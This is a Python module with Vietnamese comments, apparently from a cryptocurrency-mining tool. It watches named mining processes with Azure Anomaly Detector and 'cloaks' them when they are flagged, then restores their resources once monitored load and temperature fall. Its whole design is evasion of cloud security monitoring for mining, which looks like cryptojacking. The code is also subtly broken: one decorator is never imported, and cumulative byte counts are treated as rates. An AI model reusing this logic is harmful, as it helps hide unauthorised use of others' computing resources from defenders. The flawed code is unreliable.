# anomaly_detector.py

import psutil
import logging
import traceback
import pynvml
import asyncio
from asyncio import Queue as AsyncQueue
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from time import time

from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .auxiliary_modules.power_management import get_cpu_power, get_gpu_power
from .auxiliary_modules.temperature_monitor import get_cpu_temperature, get_gpu_temperature

# Import Interface
from .interfaces import IResourceManager

# Định nghĩa các lớp sự kiện
@dataclass
class AnomalyDetectedEvent:
    process: MiningProcess
    anomaly_details: Dict[str, Any]

@asynccontextmanager
async def acquire_lock_with_timeout(lock: asyncio.Lock, lock_type: str, timeout: float):
    """
    Async context manager để chiếm khóa với timeout.

    Args:
        lock (asyncio.Lock): Đối tượng Lock.
        lock_type (str): 'read' hoặc 'write'.
        timeout (float): Thời gian chờ (giây).

    Yields:
        The acquired lock object nếu thành công, None nếu timeout.
    """
    try:
        await asyncio.wait_for(lock.acquire(), timeout=timeout)
        try:
            yield lock
        finally:
            lock.release()
    except asyncio.TimeoutError:
        yield None

class SafeRestoreEvaluator:
    """
    Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho các tiến trình.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
        self.config = config
        self.logger = logger
        self.resource_manager = resource_manager

        # Các ngưỡng baseline
        baseline_thresholds = self.config.get('baseline_thresholds', {})
        self.baseline_cpu_usage_percent = baseline_thresholds.get('cpu_usage_percent', 80)
        self.baseline_gpu_usage_percent = baseline_thresholds.get('gpu_usage_percent', 80)
        self.baseline_ram_usage_percent = baseline_thresholds.get('ram_usage_percent', 80)
        self.baseline_disk_io_usage_mbps = baseline_thresholds.get('disk_io_usage_mbps', 80)
        self.baseline_network_usage_mbps = baseline_thresholds.get('network_usage_mbps', 80)

        # Giới hạn nhiệt độ
        temperature_limits = self.config.get("temperature_limits", {})
        self.cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
        self.gpu_max_temp = temperature_limits.get("gpu_max_celsius", 75)

        # Giới hạn công suất
        power_limits = self.config.get("power_limits", {})
        per_device_power = power_limits.get("per_device_power_watts", {})
        self.cpu_max_power = per_device_power.get("cpu", 100)
        self.gpu_max_power = per_device_power.get("gpu", 200)

    async def is_safe_to_restore(self, process: MiningProcess) -> bool:
        """
        Kiểm tra xem điều kiện có đủ an toàn để khôi phục tài nguyên cho tiến trình hay không.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.

        Returns:
            bool: True nếu an toàn để khôi phục, ngược lại False.
        """
        # 1) Kiểm tra sự tồn tại của tiến trình
        if not psutil.pid_exists(process.pid):
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
            return False

        # 2) Kiểm tra nhiệt độ CPU
        try:
            cpu_temp = await asyncio.get_event_loop().run_in_executor(None, get_cpu_temperature, process.pid)
            if cpu_temp is not None and cpu_temp >= self.cpu_max_temp:
                self.logger.info(
                    f"Nhiệt độ CPU {cpu_temp}°C vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra nhiệt độ CPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra nhiệt độ CPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 3) Kiểm tra nhiệt độ GPU
        try:
            if self.resource_manager.is_gpu_initialized():
                gpu_temps = await asyncio.get_event_loop().run_in_executor(None, get_gpu_temperature, process.pid)
                if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
                    self.logger.info(
                        f"Nhiệt độ GPU {gpu_temps}°C vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                    )
                    return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra nhiệt độ GPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra nhiệt độ GPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 4) Kiểm tra công suất CPU
        try:
            cpu_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
            if cpu_power is not None and cpu_power >= self.cpu_max_power:
                self.logger.info(
                    f"Công suất CPU {cpu_power}W vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra công suất CPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra công suất CPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 5) Kiểm tra công suất GPU
        try:
            if self.resource_manager.is_gpu_initialized():
                gpu_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
                if gpu_power is not None and gpu_power >= self.gpu_max_power:
                    self.logger.info(
                        f"Công suất GPU {gpu_power}W vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                    )
                    return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra công suất GPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra công suất GPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 6) Kiểm tra sử dụng CPU tổng thể
        try:
            total_cpu_usage = psutil.cpu_percent(interval=1)
            if total_cpu_usage >= self.baseline_cpu_usage_percent:
                self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng CPU tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 7) Kiểm tra sử dụng RAM tổng thể
        try:
            ram = psutil.virtual_memory()
            total_ram_usage_percent = ram.percent
            if total_ram_usage_percent >= self.baseline_ram_usage_percent:
                self.logger.info(f"Sử dụng RAM tổng thể {total_ram_usage_percent}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng RAM tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 8) Kiểm tra sử dụng Disk I/O
        try:
            disk_io_counters = psutil.disk_io_counters()
            total_disk_io_usage_mbps = (
                (disk_io_counters.read_bytes + disk_io_counters.write_bytes)
                / (1024 * 1024)
            )
            if total_disk_io_usage_mbps >= self.baseline_disk_io_usage_mbps:
                self.logger.info(
                    f"Sử dụng Disk I/O tổng thể {total_disk_io_usage_mbps:.2f} MBps vẫn cao."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng Disk I/O tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 9) Kiểm tra sử dụng băng thông mạng
        try:
            net_io_counters = psutil.net_io_counters()
            total_network_usage_mbps = (
                (net_io_counters.bytes_sent + net_io_counters.bytes_recv)
                / (1024 * 1024)
            )
            if total_network_usage_mbps >= self.baseline_network_usage_mbps:
                self.logger.info(
                    f"Sử dụng băng thông mạng tổng thể {total_network_usage_mbps:.2f} MBps vẫn cao."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng băng thông mạng: {e}\n{traceback.format_exc()}"
            )
            return False

        # 10) Kiểm tra bất thường qua Azure Anomaly Detector
        try:
            current_state = await self.resource_manager.collect_metrics(process)
            anomalies_detected = await asyncio.get_event_loop().run_in_executor(
                None, self.resource_manager.azure_anomaly_detector_client.detect_anomalies, current_state
            )
            if anomalies_detected:
                self.logger.info(
                    f"Azure Anomaly Detector phát hiện bất thường cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra bất thường qua Azure Anomaly Detector cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # Tất cả kiểm tra đều ổn => an toàn
        self.logger.info(
            f"Điều kiện an toàn để khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid})."
        )
        return True

class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường cho các tiến trình khai thác.
    Chịu trách nhiệm giám sát các chỉ số hệ thống và enqueue các tiến trình cần cloaking khi phát hiện bất thường.
    """
    _instance = None
    _instance_lock = asyncio.Lock()

    def __new__(cls, *args, **kwargs):
        if not cls._instance:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        BaseManager.__init__(self, config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.logger = logger
        self.config = config

        self.stop_event = asyncio.Event()

        self.mining_processes: List[MiningProcess] = []
        self.mining_processes_lock = asyncio.Lock()

        self.gpu_manager = GPUManager()
        self.gpu_initialized = self.gpu_manager.gpu_initialized
        if self.gpu_initialized:
            self.logger.info("GPUManager đã được khởi tạo thành công.")
        else:
            self.logger.warning("GPUManager không được khởi tạo. Các chức năng liên quan đến GPU sẽ bị vô hiệu hóa.")

        self.resource_manager: Optional[IResourceManager] = None
        self.safe_restore_evaluator: Optional[SafeRestoreEvaluator] = None

        # Sử dụng asyncio tasks thay vì ThreadPoolExecutor
        self.task_futures = []

    def set_resource_manager(self, resource_manager: IResourceManager):
        """
        Thiết lập ResourceManager cho AnomalyDetector.

        Args:
            resource_manager (IResourceManager): Instance của ResourceManager.
        """
        self.resource_manager = resource_manager
        self.logger.info("ResourceManager đã được thiết lập cho AnomalyDetector.")

        self.safe_restore_evaluator = SafeRestoreEvaluator(
            self.config,
            self.logger,
            self.resource_manager
        )

        # Start các task
        loop = asyncio.get_event_loop()
        self.task_futures.append(loop.create_task(self.anomaly_detection()))
        self.task_futures.append(loop.create_task(self.monitor_restoration()))

    async def start(self):
        """
        Bắt đầu AnomalyDetector, bao gồm việc khởi động coroutine phát hiện bất thường.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")
        await self.discover_mining_processes_async()
        self.logger.info("AnomalyDetector đã được khởi động thành công.")

    async def discover_mining_processes_async(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        cpu_process_name = self.config['processes'].get('CPU', '').lower()
        gpu_process_name = self.config['processes'].get('GPU', '').lower()

        async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
            if write_lock is None:
                self.logger.error("Failed to acquire mining_processes_lock trong discover_mining_processes.")
                return

            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if cpu_process_name in proc_name or gpu_process_name in proc_name:
                        priority = self.get_process_priority(proc.info['name'])
                        network_interface = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'],
                            proc.info['name'],
                            priority,
                            network_interface,
                            self.logger
                        )
                        mining_proc.is_cloaked = False
                        self.mining_processes.append(mining_proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.

        Args:
            process_name (str): Tên của tiến trình.

        Returns:
            int: Độ ưu tiên của tiến trình.
        """
        priority_map = self.config.get('process_priority_map', {})
        priority = priority_map.get(process_name.lower(), 1)
        if not isinstance(priority, int):
            self.logger.warning(
                f"Độ ưu tiên cho tiến trình '{process_name}' không phải là int. Sử dụng mặc định = 1. priority={priority}"
            )
            priority = 1
        return priority

    async def anomaly_detection(self):
        """
        Coroutine để phát hiện bất thường trong các tiến trình khai thác.
        Sử dụng asyncio tasks để xử lý các tiến trình song song.
        """
        detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
        cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
        last_detection_time = 0

        while not self.stop_event.is_set():
            current_time = time()

            # Chỉ chạy nếu đã đủ thời gian giữa hai lần kiểm tra
            if current_time - last_detection_time < detection_interval:
                await asyncio.sleep(1)
                continue

            last_detection_time = current_time

            try:
                await self.discover_mining_processes_async()

                if self.resource_manager is None:
                    self.logger.error("ResourceManager chưa được thiết lập. Không thể tiến hành phát hiện bất thường.")
                    continue

                # Sao chép danh sách để tránh giữ lock khi xử lý
                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
                    if read_lock is None:
                        self.logger.error("Failed to acquire mining_processes_lock trong anomaly_detection.")
                        continue
                    processes = list(self.mining_processes)

                # Sử dụng asyncio.gather để xử lý các tiến trình song song
                tasks = []
                for process in processes:
                    task = self.evaluate_process_anomaly(process, cloak_activation_delay)
                    tasks.append(task)

                await asyncio.gather(*tasks)

            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(1)  # Nghỉ ngắn để tránh vòng lặp quá sát

    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_activation_delay: int):
        """
        Đánh giá bất thường cho một tiến trình cụ thể và enqueue cloaking nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cloak_activation_delay (int): Thời gian trì hoãn trước khi kích hoạt cloaking (giây).
        """
        try:
            # Kiểm tra sự tồn tại của tiến trình
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
                return

            # 1) Phát hiện bất thường qua Azure Anomaly Detector
            current_state = await self.resource_manager.collect_metrics(process)
            anomalies_detected = await asyncio.get_event_loop().run_in_executor(
                None, self.resource_manager.azure_anomaly_detector_client.detect_anomalies, current_state
            )
            if anomalies_detected:
                self.logger.warning(
                    f"Phát hiện bất thường trong tiến trình {process.name} (PID={process.pid}) thông qua Azure Anomaly Detector. "
                    f"Sẽ kích hoạt cloaking sau {cloak_activation_delay} giây."
                )
                # Phát sinh sự kiện cloaking sau delay
                await asyncio.sleep(cloak_activation_delay)
                event = AnomalyDetectedEvent(
                    process=process,
                    anomaly_details={"detected_by": "AzureAnomalyDetector"}
                )
                await self.resource_manager.enqueue_event(event)
                process.is_cloaked = True
                return

            # 2) Kiểm tra alerts từ Azure Sentinel (Đã bị loại bỏ hoặc có thể thêm lại)
            # TODO: Thêm xử lý nếu cần

            # 3) Kiểm tra AML logs từ Azure Log Analytics (Đã bị loại bỏ hoặc có thể thêm lại)
            # TODO: Thêm xử lý nếu cần

        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi đánh giá bất thường.")
            return
        except Exception as e:
            self.logger.error(f"Lỗi trong evaluate_process_anomaly cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def monitor_restoration(self):
        """
        Coroutine để xử lý việc khôi phục tài nguyên cho các tiến trình đã cloaked nếu điều kiện an toàn.
        """
        while not self.stop_event.is_set():
            try:
                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
                    if read_lock is None:
                        self.logger.error("Failed to acquire mining_processes_lock trong monitor_restoration.")
                        await asyncio.sleep(60)
                        continue
                    cloaked_processes = [proc for proc in self.mining_processes if proc.is_cloaked]

                tasks = []
                for process in cloaked_processes:
                    task = self.safe_restore_evaluator.is_safe_to_restore(process)
                    tasks.append(task)

                results = await asyncio.gather(*tasks)

                for process, is_safe in zip(cloaked_processes, results):
                    if is_safe:
                        self.logger.info(f"Điều kiện đã đạt để khôi phục tài nguyên cho PID={process.pid}.")
                        await self.resource_manager.enqueue_restoration(process)
                        process.is_cloaked = False
                        self.logger.info(f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
                    else:
                        self.logger.debug(f"Điều kiện chưa đạt để khôi phục tài nguyên cho PID={process.pid}.")

                await asyncio.sleep(60)  # Kiểm tra mỗi 60 giây

            except Exception as e:
                self.logger.error(f"Lỗi trong monitor_restoration: {e}\n{traceback.format_exc()}")
                await asyncio.sleep(60)  # Đợi trước khi thử lại

    async def stop(self):
        """
        Dừng AnomalyDetector, bao gồm việc dừng coroutine phát hiện bất thường và các task.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()
        # Cancel các task
        for task in self.task_futures:
            task.cancel()
        # Chờ các task hoàn thành
        await asyncio.gather(*self.task_futures, return_exceptions=True)
        self.logger.info("AnomalyDetector đã dừng thành công.")
